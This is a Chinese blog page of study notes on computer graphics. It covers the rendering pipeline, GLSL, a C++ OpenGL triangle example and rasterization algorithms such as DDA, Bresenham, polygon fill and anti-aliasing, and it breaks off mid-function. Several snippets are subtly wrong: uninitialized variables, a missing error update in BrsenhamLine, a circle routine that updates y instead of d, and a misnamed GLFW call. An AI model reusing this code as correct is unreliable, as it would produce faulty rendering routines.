<p>应用程序阶段：产生顶点数据，摄像机位置，光照和纹理等。</p>
<p>几何阶段：变形投影后的定点，颜色，纹理。</p>
<p>光栅化：给每个像素正确配色。输出到屏幕的各个像素点颜色。</p>
<h3 id="渲染管线"><a href="#渲染管线" class="headerlink" title="渲染管线"></a>渲染管线</h3><img src="/2020/02/26/%E6%B8%B8%E6%88%8F/GraphTheory/pipeline.png" class="" title="渲染管线">

<p>可编程：顶点着色器，几何&#x2F;曲面细分着色器，片元着色器</p>
<p>可选：几何&#x2F;曲面细分着色器</p>
<p>可配置：裁剪，片元操作</p>
<p>固定：屏幕映射，三角形设置，三角形遍历</p>
<p>顶点着色器：</p>
<ul>
<li>模型变换：将模型坐标映射到世界坐标</li>
<li>视图变换：将世界坐标映射到摄像机中</li>
<li>顶点着色</li>
</ul>
<p>几何&#x2F;曲面细分着色器：顶点增删，曲面细分</p>
<p>三角形遍历：求三角形覆盖的像素点，插值等方式</p>
<p>片元着色器：纹理贴图</p>
<h3 id="着色器语言"><a href="#着色器语言" class="headerlink" title="着色器语言"></a>着色器语言</h3><p>Phong光照明模型，Cook着色树</p>
<p>Renderman，Pixiv公司</p>
<p>OpenGL GLSL，可以跨平台</p>
<h4 id="GLSL"><a href="#GLSL" class="headerlink" title="GLSL"></a>GLSL</h4><p>着色器：</p>
<ul>
<li>顶点着色器Vertex Shader</li>
<li>几何着色器Geometry Shader</li>
<li>曲面细分着色器Tessellation Shader</li>
<li>片元着色器Fragment Shader</li>
</ul>
<p>在OpenGL中使用着色器流程：</p>
<ul>
<li>创建着色器对象</li>
<li>源码关联着色器对象</li>
<li>编译着色器</li>
<li>创建程序对象</li>
<li>将着色器关联到程序对象</li>
</ul>
<p>OpenGL通过uniform与GLSL通信。着色器之间通过in，inout，out调用函数。</p>
<p>数据类型：</p>
<ul>
<li>标量</li>
<li>矢量，可以是2 3 4个分量</li>
<li>矩阵</li>
<li>结构和数组</li>
</ul>
<p>控制结构，类似于C</p>
<p>EBO：索引缓冲区对象，存储顶点的索引信息</p>
<p>VBO：顶点缓冲区对象，存储顶点的各种信息，存入显存</p>
<p>VAO：顶点数组对象，对VBO组的引用</p>
<h4 id="GLSL-实验"><a href="#GLSL-实验" class="headerlink" title="GLSL 实验"></a>GLSL 实验</h4><p>开发环境：</p>
<ul>
<li>Visual Studio 2017</li>
<li>OpenGL3.3</li>
<li>GLSL330</li>
<li>GLFW</li>
<li>GLAD</li>
</ul>
<p>工程目录：</p>
<ul>
<li>src<ul>
<li>.cpp</li>
</ul>
</li>
<li>res<ul>
<li>shader</li>
<li>texture</li>
<li>model</li>
</ul>
</li>
<li>include<ul>
<li>.h</li>
</ul>
</li>
</ul>
<p>过程： </p>
<p>初始化GLFW：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 初始化GLFW</span></span><br><span class="line"><span class="built_in">glfwInit</span>();</span><br><span class="line"><span class="comment">// 配置主版本号</span></span><br><span class="line"><span class="built_in">glfwWindowHint</span>(GLFW_CONTEXT_VERSION_MAJOR, <span class="number">3</span>);</span><br><span class="line"><span class="comment">// 配置次版本号</span></span><br><span class="line"><span class="built_in">glfwWindowHint</span>(GLFW_CONTEXT_VERSION_MINOR, <span class="number">3</span>);</span><br><span class="line"><span class="comment">// 使用核心模式，无需向后兼容</span></span><br><span class="line"><span class="built_in">glfwWindowHint</span>(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);</span><br><span class="line"><span class="comment">// Mac OS X系统使用</span></span><br><span class="line"><span class="built_in">glfwWindowHint</span>(GLFW_OPENGL_FORWARD_COMPAT, GL_TRUE);</span><br><span class="line"><span class="comment">// 不可改变窗口大小，Mac OS</span></span><br><span class="line"><span class="built_in">glfwWindowHint</span>(GLFW_RESIZABLE, FALSE);</span><br></pre></td></tr></table></figure>

<p>创建窗口：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> screen_width = <span class="number">1280</span>;</span><br><span class="line"><span class="type">int</span> screen_height = <span class="number">720</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">auto</span> window = <span class="built_in">glfwCreateWindow</span>(</span><br><span class="line">    screen_width,   <span class="comment">// 窗口尺寸</span></span><br><span class="line">    screen_height,   </span><br><span class="line">    <span class="string">&quot;Window Title&quot;</span>, <span class="comment">// 标题</span></span><br><span class="line">    <span class="literal">nullptr</span>,  <span class="comment">// 是否全屏</span></span><br><span class="line">    <span class="literal">nullptr</span>,  <span class="comment">// 共享上下文（状态机）窗口</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(window == <span class="literal">nullptr</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将窗口的上下文设置为当前线程的主上下文</span></span><br><span class="line"><span class="built_in">glvwMakeContextCurrent</span>(window);</span><br></pre></td></tr></table></figure>

<p>初始化GLAD：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 初始化GLAD，加载OPENGL函数指针地址的函数</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">gladLoadGLLoader</span>((GLADloadproc)glfwGetProcAddress))&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建视口：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 左下角位置，渲染窗口的宽，高</span></span><br><span class="line"><span class="built_in">glViewport</span>(<span class="number">0</span>, <span class="number">0</span>, screen_width, screen_height);</span><br></pre></td></tr></table></figure>

<p>数据处理：生成和绑定VBO，VAO，属性指针</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 三角形定点数据</span></span><br><span class="line"><span class="type">const</span> <span class="type">float</span> triangle[] = &#123;</span><br><span class="line">    <span class="number">-0.5f</span>, <span class="number">-0.5f</span>,  <span class="number">0.0f</span>, <span class="comment">// 左下</span></span><br><span class="line">     <span class="number">0.5f</span>, <span class="number">-0.5f</span>,  <span class="number">0.0f</span>, <span class="comment">// 右上</span></span><br><span class="line">     <span class="number">0.0f</span>,  <span class="number">0.5f</span>,  <span class="number">0.0f</span>  <span class="comment">// 正上</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 生成与绑定VAO VBO</span></span><br><span class="line">GLuint vertex_array_object; <span class="comment">// VAO</span></span><br><span class="line"><span class="built_in">glGenVertexArrays</span>(<span class="number">1</span>, &amp;vertex_array_object);</span><br><span class="line"><span class="built_in">glBindVertexArray</span>(vertex_array_object);</span><br><span class="line"></span><br><span class="line">GLuint vertex_buffer_object; <span class="comment">// VBO</span></span><br><span class="line"><span class="built_in">glGenBuffers</span>(<span class="number">1</span>, &amp;vertex_buffer_object);</span><br><span class="line"><span class="built_in">glBindBuffer</span>(GL_ARRAY_BUFFER, vertex_buffer_object);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将定点数据绑定到缓冲，这样可以借助VBO将数据一次性发送过去</span></span><br><span class="line"><span class="comment">// GL_STATIC_DRAW表示图像不会变化</span></span><br><span class="line"><span class="built_in">glBufferData</span>(GL_ARRAY_BUFFER, <span class="built_in">sizeof</span>(triangle), triangle, GL_STATIC_DRAW);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置顶点属性指针</span></span><br><span class="line"><span class="built_in">glVertexAttribPointer</span>(</span><br><span class="line">    <span class="number">0</span>, <span class="comment">// 顶点着色器位置</span></span><br><span class="line">    <span class="number">3</span>, <span class="comment">// 顶点向量长度</span></span><br><span class="line">    GL_FLOAT,  <span class="comment">// 顶点类型</span></span><br><span class="line">    GL_FALSE,  <span class="comment">// 是否标准化</span></span><br><span class="line">    <span class="number">3</span>*<span class="built_in">sizeof</span>(<span class="type">float</span>),  <span class="comment">// 步长</span></span><br><span class="line">    (<span class="type">void</span>*)<span class="number">0</span>   <span class="comment">// 数据在数组的偏移量</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">// 开启该通道</span></span><br><span class="line"><span class="built_in">glEnableVertexAttribArray</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>着色器：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 顶点着色器</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *vertex_shader_source = </span><br><span class="line">    <span class="string">&quot;#version 330 core\n&quot;</span></span><br><span class="line">    <span class="string">&quot;layout(location = 0) in vec3 aPos;\n&quot;</span>  <span class="comment">// 位置变量的属性位置值 0</span></span><br><span class="line">    <span class="string">&quot;void main()\n&quot;</span></span><br><span class="line">    <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;    gl_Position = vec4(aPos, 1.0);\n&quot;</span></span><br><span class="line">    <span class="string">&quot;&#125;\n\0&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 片段着色器</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *fragment_shader_source = </span><br><span class="line">    <span class="string">&quot;#version 330 core\n&quot;</span></span><br><span class="line">    <span class="string">&quot;out vec4 FragColor;\n&quot;</span>  <span class="comment">// 输出的颜色向量</span></span><br><span class="line">    <span class="string">&quot;void main()\n&quot;</span></span><br><span class="line">    <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;    FragColor = vec4(1.0f, 0.5f, 0.2f, 1.0f);\n&quot;</span></span><br><span class="line">    <span class="string">&quot;&#125;\n\0&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>生成和编译着色器：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 顶点着色器</span></span><br><span class="line"><span class="type">int</span> vertex_shader = <span class="built_in">glCreateShader</span>(GL_VERTEX_SHADER);</span><br><span class="line"><span class="built_in">glShaderSource</span>(vertex_shader, <span class="number">1</span>, &amp;vertex_shader_source, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">glCompileShader</span>(vertex_shader);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> success;</span><br><span class="line"><span class="type">char</span> info_log[<span class="number">512</span>];</span><br><span class="line"><span class="built_in">glGetShaderiv</span>(vertex_shader, GL_COMPILE_STATUS, &amp;success);</span><br><span class="line"><span class="comment">// 检查是否编译成功</span></span><br><span class="line"><span class="keyword">if</span>(!success)&#123;</span><br><span class="line">    <span class="built_in">glGetShaderInfoLog</span>(vertex_shader, <span class="number">512</span>, <span class="literal">NULL</span>, info_log);</span><br><span class="line">    std::cout&lt;&lt;info_log&lt;&lt;std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 片段着色器</span></span><br><span class="line"><span class="type">int</span> fragment_shader = <span class="built_in">glCreateShader</span>(GL_FRAGMENT_SHADER);</span><br><span class="line"><span class="built_in">glShaderSource</span>(fragment_shader, <span class="number">1</span>, &amp;fragment_shader_source, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">glCompileShader</span>(fragment_shader);</span><br><span class="line"></span><br><span class="line"><span class="built_in">glGetShaderiv</span>(fragment_shader, GL_COMPILE_STATUS, &amp;success);</span><br><span class="line"><span class="comment">// 检查是否编译成功</span></span><br><span class="line"><span class="keyword">if</span>(!success)&#123;</span><br><span class="line">    <span class="built_in">glGetShaderInfoLog</span>(fragment_shader, <span class="number">512</span>, <span class="literal">NULL</span>, info_log);</span><br><span class="line">    std::cout&lt;&lt;info_log&lt;&lt;std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>链接着色器：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 链接到着色器程序</span></span><br><span class="line"><span class="type">int</span> shader_program = <span class="built_in">glCreateProgram</span>();</span><br><span class="line"><span class="built_in">glAttachShader</span>(shader_program, vertex_shader);</span><br><span class="line"><span class="built_in">glAttachShader</span>(shader_program, fragment_shader);</span><br><span class="line"><span class="built_in">glLinkProgram</span>(shader_program);</span><br><span class="line"><span class="comment">// 检查是否链接成功</span></span><br><span class="line"><span class="built_in">glGetProgramiv</span>(shader_program, GL_LINK_STATUS, &amp;success);</span><br><span class="line"><span class="keyword">if</span>(!success)&#123;</span><br><span class="line">    <span class="built_in">glGetProgramInfoLog</span>(shader_program, <span class="number">512</span>, <span class="literal">NULL</span>, info_log);</span><br><span class="line">    std::cout&lt;&lt;info_log&lt;&lt;std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>删除着色器：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">glDeleteShader</span>(vertex_shader);</span><br><span class="line"><span class="built_in">glDeleteShader</span>(fragment_shader);</span><br></pre></td></tr></table></figure>

<p>渲染：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(!<span class="built_in">glfwWindowShouldClose</span>(window))&#123;</span><br><span class="line">    <span class="comment">// 清空颜色缓存，使用黑色清空</span></span><br><span class="line">    <span class="built_in">glClearColor</span>(<span class="number">0.0f</span>, <span class="number">0.0f</span>, <span class="number">0.0f</span>, <span class="number">1.0f</span>);</span><br><span class="line">    <span class="built_in">glClear</span>(GL_COLOR_BUFFER_BIT);</span><br><span class="line">    <span class="comment">// 使用着色器</span></span><br><span class="line">    <span class="built_in">glUseProgram</span>(shader_program);</span><br><span class="line">    <span class="comment">// 绘制三角形</span></span><br><span class="line">    <span class="built_in">glBindVertexArray</span>(vertex_array_object);  <span class="comment">// 绑定VAO</span></span><br><span class="line">    <span class="built_in">glDrawArrays</span>(GL_TRIANGLES, <span class="number">0</span>, <span class="number">3</span>);        <span class="comment">// 绘制三角形</span></span><br><span class="line">    <span class="built_in">glBindVertexArray</span>(<span class="number">0</span>);                    <span class="comment">// 解除绑定</span></span><br><span class="line">    <span class="comment">// 交换缓冲，双缓冲技术</span></span><br><span class="line">    <span class="comment">// 检查是否有触发事件，键盘，鼠标等</span></span><br><span class="line">    <span class="built_in">glfwSwapBuffers</span>(window);</span><br><span class="line">    <span class="built_in">glfwPollEvents</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>善后工作：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 删除VAO VBO</span></span><br><span class="line"><span class="built_in">glDeleteVertexArrays</span>(<span class="number">1</span>, &amp;vertex_array_object);</span><br><span class="line"><span class="built_in">glDeleteBuffers</span>(<span class="number">1</span>, &amp;vertex_buffer_object);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 清理资源，退出程序</span></span><br><span class="line"><span class="built_in">glfwTerminate</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<h3 id="扫描转换"><a href="#扫描转换" class="headerlink" title="扫描转换"></a>扫描转换</h3><p>软光栅：通过描述的点数据来光栅化对应的像素，通过软件实现。</p>
<p>光栅化方案：<br>点：直接四舍五入<br>直线：</p>
<ul>
<li>要求</li>
<li>直线要直</li>
<li>端点要准确，要无定向性和断裂</li>
<li>亮度，色泽要均匀</li>
<li>处理不同的线宽，颜色，线型</li>
<li>算法</li>
<li>驻点比较</li>
<li>正负法</li>
<li>数值微分</li>
<li>Bresenham算法<br>圆：</li>
<li>算法</li>
<li>八分法</li>
<li>Bresenham算法<br>多边形填充：</li>
<li>算法</li>
<li>X 扫描线思想</li>
<li>Y 向连贯性算法</li>
<li>边标志算法<br>区域填充：</li>
<li>表示</li>
<li>边界表示法</li>
<li>内点表示法</li>
<li>分类</li>
<li>4邻接点</li>
<li>8邻接点</li>
<li>算法</li>
<li>种子填充算法<ul>
<li>4连通算法</li>
<li>8连通算法</li>
<li>边界填充（边界）</li>
<li>泛填充（内点）<br>属性：</li>
</ul>
</li>
<li>分类</li>
<li>线型</li>
<li>粗细</li>
<li>颜色</li>
<li>填充色（图案）</li>
<li>算法</li>
<li>线型：像素模板<code>11101110</code></li>
<li>线宽：像素模板 <ul>
<li>线刷子（水平、垂直），线帽，折角处</li>
<li>方刷子</li>
</ul>
</li>
<li>填充色：像素模板，遍历</li>
</ul>
<h4 id="数值微分"><a href="#数值微分" class="headerlink" title="数值微分"></a>数值微分</h4><p>数值微分DDA，从直线的微分方程生成直线。<br>计算直线的微分方程，得到斜率 <code>K</code>。<br>根据<code>K</code>和起始点坐标，按照<code>△x*t</code>增量求下一个点。<br><code>t</code>取值为<code>1/max(|△x|, |△y|)</code>。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">DDAline</span><span class="params">(<span class="type">int</span> x0, <span class="type">int</span> y0, <span class="type">int</span> x1, <span class="type">int</span> y1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> dx, dy, espl, k;</span><br><span class="line">    <span class="type">float</span> x, y, xlncre, ylncre;</span><br><span class="line">    dx = x1-x0;</span><br><span class="line">    dy = y1-y0;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">abs</span>(dx)&gt;<span class="built_in">abs</span>(dy))&#123;</span><br><span class="line">        espl = <span class="built_in">abs</span>(dx);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        espl = <span class="built_in">abs</span>(dy);</span><br><span class="line">    &#125;</span><br><span class="line">    xlncre = (<span class="type">float</span>)dx/(<span class="type">float</span>)espl;</span><br><span class="line">    ylncre = (<span class="type">float</span>)dy/(<span class="type">float</span>)espl;</span><br><span class="line">    <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;=espl;k++)&#123;</span><br><span class="line">        <span class="built_in">putpixel</span>((<span class="type">int</span>)(x+<span class="number">0.5</span>), (<span class="type">int</span>)(y+<span class="number">0.5</span>));</span><br><span class="line">        x += xlncre;</span><br><span class="line">        y += ylncre;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>评价：算法容易实现，但是效率较低（浮点数）</p>
<h4 id="Bresenham-直线算法"><a href="#Bresenham-直线算法" class="headerlink" title="Bresenham 直线算法"></a>Bresenham 直线算法</h4><p>由直线的两个端点可以得到直线：<code>F(x, y)=0</code></p>
<p>当 <code>0&lt;=k&lt;=1</code> 时：由当前点P0求得候选点为<code>Pu(x(i+1), y(i+1))</code>与<code>Pd(x(x+1), y(i))</code>。求这两个候选点的中点<code>P(m, n)</code>，如果中点处于直线上方，也就是<code>F(m, n)&gt;0</code>，就选择<code>Pd</code>点；否则选<code>Pu</code>点。</p>
<p>构造判别式：<code>d = F(x[i]+1, y[i]+0.5) = y[i]+0.5-k*(x[i]+1)-b</code><br>若d&gt;&#x3D;0，选Pd，否则选Pu。<br>即d&gt;&#x3D;0，y不变，否则增加1。</p>
<p>d 的递推计算：<br>    d0    ：d &#x3D; 0.5-k<br>    d &gt;&#x3D; 0：d &#x3D; d-k<br>    d &lt;  0：d &#x3D; d-k+1</p>
<p>消除浮点数（放大为整数）：<br>    d&#x3D;d<em>2<br>    k&#x3D;k</em>dx</p>
<p>优化：<br>直接按照<code>d</code>选择Pu，Pd。<br>    d &#x3D; -0.5<br>    <code>d = d + k, x[i+1]=x[i]+1</code><br>    d &gt;  0.5：<code>y[i+1]=y[i]+1, d=d-1</code><br>    d &lt;&#x3D; 0.5：<code>y[i+1]=y[i]</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">MidBrsenhamLine</span><span class="params">(<span class="type">int</span> x0, <span class="type">int</span> y0, <span class="type">int</span> x1, <span class="type">int</span> y1, <span class="type">int</span> color)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> dx, dy, d, UpIncre, DownIncre, x, y;</span><br><span class="line">    <span class="keyword">if</span>(x0 &gt; x1)&#123;</span><br><span class="line">        x=x1; x1=x0; x0=x;</span><br><span class="line">        y=y1; y1=y0; y0=y;</span><br><span class="line">    &#125;</span><br><span class="line">    x=x0; y=y0;</span><br><span class="line">    dx=x1-x0;</span><br><span class="line">    dy=y1-y0;</span><br><span class="line">    d=dx<span class="number">-2</span>*dy;</span><br><span class="line">    UpIncre=<span class="number">2</span>*dx<span class="number">-2</span>*dy;</span><br><span class="line">    DownIncre=<span class="number">-2</span>*dy;</span><br><span class="line">    <span class="keyword">while</span>(x &lt;= x1)&#123;</span><br><span class="line">        <span class="built_in">putpixel</span>(x, y, color);</span><br><span class="line">        x++;</span><br><span class="line">        <span class="keyword">if</span>(d &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            y++;</span><br><span class="line">            d+=UpIncre;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            d+=DownIncre;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">BrsenhamLine</span><span class="params">(<span class="type">int</span> x0, <span class="type">int</span> y0, <span class="type">int</span> x1, <span class="type">int</span> y1, <span class="type">int</span> color)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> dx, dy, e, x, y;</span><br><span class="line"></span><br><span class="line">    dx=x1-x0;</span><br><span class="line">    dy=y1-y0;</span><br><span class="line">    e=-dx;</span><br><span class="line">    x=x0;</span><br><span class="line">    y=y0;</span><br><span class="line">    <span class="keyword">while</span>(x &lt;= x1)&#123;</span><br><span class="line">        <span class="built_in">putpixel</span>(x, y, color);</span><br><span class="line">        x++;</span><br><span class="line">        <span class="keyword">if</span>(e &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            y++;</span><br><span class="line">            e=e<span class="number">-2</span>*dx;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="八分法"><a href="#八分法" class="headerlink" title="八分法"></a>八分法</h4><p>将圆八等分，取其中一段圆弧，y&#x3D;x与y轴正方向所夹圆弧，<code>y=sqrt(R^2-x^2)</code><br>离散计算：<br><code>x[i+1]=x[i]+1, y[i+1]=sqrt(R^2-x[i+1])</code></p>
<p>先计算x还是先计算y，要看所选的圆弧在斜率是否大于1。</p>
<p>或使用极坐标，还是那一段圆弧：<br><code>a[i+1]=a[i]+da</code> a -&gt; 角度<br><code>x[i+1]=round(R*cos(a[i+1]))</code><br><code>y[i+1]=round(R*sin(a[i+1]))</code></p>
<h4 id="Bresenham-圆算法"><a href="#Bresenham-圆算法" class="headerlink" title="Bresenham 圆算法"></a>Bresenham 圆算法</h4><p>构造函数<code>F(x, y)=x^2+y^2-R^2</code></p>
<p>将圆八等分，取其中一段圆弧，y&#x3D;x与y轴正方向所夹圆弧。</p>
<p>此时最大位移方向是x方向，x每次加一，y不变或减1（两个候选点）。</p>
<p>计算d的递推和初值。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">MidBrsenhamCircle</span><span class="params">(<span class="type">int</span> r, <span class="type">int</span> color)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> d, x, y;</span><br><span class="line"></span><br><span class="line">    x=<span class="number">0</span>;</span><br><span class="line">    y=r;</span><br><span class="line">    d=<span class="number">1</span>-r;</span><br><span class="line">    <span class="keyword">while</span>(x &lt;= y)&#123;</span><br><span class="line">        <span class="built_in">CirclePoint</span>(x, y, color)</span><br><span class="line">        <span class="keyword">if</span>(d &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            d+=<span class="number">2</span>*x+<span class="number">3</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            y+=<span class="number">2</span>*(x-y)+<span class="number">5</span>;</span><br><span class="line">            y--;</span><br><span class="line">        &#125;</span><br><span class="line">        x++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Bresenham-椭圆算法"><a href="#Bresenham-椭圆算法" class="headerlink" title="Bresenham 椭圆算法"></a>Bresenham 椭圆算法</h4><p>对于标准椭圆<code>F(x, y)=b^2*x^2+a^2*y^2-a^2*b^2</code></p>
<p>将椭圆等分为4部分，同时判断x和y是否加1。</p>
<p>计算d的递推和初值。</p>
<h4 id="X-扫描线"><a href="#X-扫描线" class="headerlink" title="X 扫描线"></a>X 扫描线</h4><p>求得多边形各个顶点的<code>y[min]</code>与<code>y[max]</code>。</p>
<p>使用扫描线与多边形求交点。</p>
<p>对交点排序，填充交点之间的空间。</p>
<h4 id="Y-向连贯性算法"><a href="#Y-向连贯性算法" class="headerlink" title="Y 向连贯性算法"></a>Y 向连贯性算法</h4><p>构造多边形的边表：边表的长度是多边形的最大扫描线数，表上每个节点表示一个桶，桶上标明当前扫描线的y坐标。再将每条边放入该边<code>y[min]</code>的桶中。</p>
<p>每条新边记录的信息包括该边起点与x扫描线的交点x，该边的<code>y[max]</code>，斜率<code>1/k</code>（y+1时x的增量），下一条边指针next。</p>
<p>新边排序按照x坐标递增，如果交点相同则按增量递增。</p>
<p>对于每条边<code>y[max]=y[max]-1</code>，防止交点重复计算。</p>
<p>有效边表：当前扫描线与多边形相交的边构成的表。</p>
<p>扫描过程让有效边表与边表合并，并根据增量修改x值。通过顶点配对实现相应的填充。</p>
<h4 id="边标志算法"><a href="#边标志算法" class="headerlink" title="边标志算法"></a>边标志算法</h4><p>对多边形的每个边进行直线扫描转换，给覆盖的点打上标记。</p>
<p>对扫描线上按照左闭右开的原则配对标记点并填色。</p>
<p>是适合硬件的算法。</p>
<h4 id="种子填充算法"><a href="#种子填充算法" class="headerlink" title="种子填充算法"></a>种子填充算法</h4><p>种子：区域内任意一点。</p>
<ol>
<li>边界填充算法：</li>
</ol>
<ul>
<li>输入：种子点坐标，填充色，边界色</li>
<li>数据结构：栈</li>
<li>算法输出：像素点集</li>
</ul>
<p>4连通边界填充算法：种子入栈，执行下面步骤；<br>栈顶出栈，置为填充色，并检查4邻接点：如果不是边界色，且没有被填充则入栈。</p>
<ol start="2">
<li><p>泛填充算法：是内点且未被填充，则入栈。</p>
</li>
<li><p>扫描线填充：<br>种子入栈；<br>栈顶出栈，填充该行；<br>检查扫描线上下的像素，其中最右边的入栈；</p>
</li>
</ol>
<h3 id="反走样技术"><a href="#反走样技术" class="headerlink" title="反走样技术"></a>反走样技术</h3><p>过取样（后滤波）：先提高取样分辨率，再取平均，降低分辨率。</p>
<p>对某一个像素扩充为3*3区域，并为区域上每一点赋予权值，再加权平均后合并为一个像素。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">MidBrsenhamLine</span><span class="params">(<span class="type">int</span> x0, <span class="type">int</span> y0, <span class="type">int</span> x1, <span class="type">int</span> y1, <span class="type">int</span> color)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> dx, dy, d, UpIncre, DownIncre, x, y;</span><br><span class="line">    <span class="type">int</span> level;</span><br><span class="line">    <span class="keyword">if</span>(x0 &gt; x1)&#123;</span><br><span class="line">        x=x1; x1=x0; x0=x;</span><br><span class="line">        y=y1; y1=y0; y0=y;</span><br><span class="line">    &#125;</span><br><span class="line">    x=x0; y=y0;</span><br><span class="line">    dx=x1-x0;</span><br><span class="line">    dy=y1-y0;</span><br><span class="line">    d=dx<span class="number">-2</span>*dy;</span><br><span class="line">    UpIncre=<span class="number">2</span>*dx<span class="number">-2</span>*dy;</span><br><span class="line">    DownIncre=<span class="number">-2</span>*dy;</span><br><span class="line">    <span class="keyword">while</span>(x &lt;= x1)&#123;</span><br><span class="line">        level = __level;  <span class="comment">// 4个像素的亮度等级平均值</span></span><br><span class="line">        <span class="built_in">putpixel</span>(x, y, color);</span><br><span class="line">        x++;</span><br><span class="line">        <span class="keyword">if</span>(d &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            y++;</span><br><span class="line">            d+=UpIncre;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            d+=DownIncre;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>前滤波：区域取样。对图形覆盖到的像素，根据图形与像素重叠部分占像素面积的比值计算像素点亮度；改进后可以使用圆形模板，通过在像素中心的距离上积分权值得到亮度。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AntialiasingLine</span><span class="params">(<span class="type">int</span> x0, <span class="type">int</span> y0, <span class="type">int</span> x1, <span class="type">int</span> y1, <span class="type">int</span> I)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> x, y, dx, dy, m, w, e;</span><br><span class="line">    x=x0; y=y0;</span><br><span class="line">    dx=x1-x0;</span><br><span class="line">    dy=y1-y0;</span><br><span class="line">    m=I*dy/dx;</span><br><span class="line">    w=I-m;</span><br><span class="line">    e=I/<span class="number">2</span>;</span><br><span class="line">    <span class="built_in">SetPixel</span>(x, y, m/<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">while</span>(x &lt; x1)&#123;</span><br><span class="line">        <span class="keyword">if</span>(e&lt;w)&#123;</span><br><span class="line">            x++; e+=m;</span><br><span class="line">        &#125;<span 